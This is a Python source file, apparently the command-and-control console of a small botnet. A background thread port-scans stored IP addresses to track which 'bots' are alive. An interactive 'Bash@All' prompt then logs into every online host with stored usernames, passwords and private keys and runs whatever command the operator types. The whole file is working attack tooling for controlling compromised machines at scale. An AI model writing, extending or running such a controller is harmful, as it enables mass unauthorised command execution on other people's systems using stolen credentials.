import threading
from time import sleep
from modules.scanner import portscanner
from modules import db,bot,printer

hosts=""
def update_session():
    """This module runs automatically in the background and updates ip addresses that are alive or dead"""
    global hosts
    while(True):
        db.connect()
        hosts=db.get_online()
        ipaddr=db.get_ip()
        for ip in ipaddr:
            addr=ip.__getitem__(0)
            if(portscanner(addr)):
                db.connect()
                db.update_db(addr,1)
            else:
                db.connect()
                db.update_db(addr,0)
        sleep(30)

def shell():
    """This function get's all the avlaible bots that are online"""
    while True:
        cmd=input(printer.color_red("[+] Bash@All >"))
        if(cmd=="exit"):
            break
        else:
            for ip in hosts:
                id,host,port,username,password,pkey,session=ip
                printer.print_success("Connecting to Bot:%s"%host)
                if(str(pkey)=='None'):
                     pkey=''
                if(bot.connect(host,port,username,password,pkey)):
                    bot.sendCommand(cmd)
def main():
    thread=threading.Thread(target=update_session,args=())
    thread.daemon=True
    thread.start()
    shell()
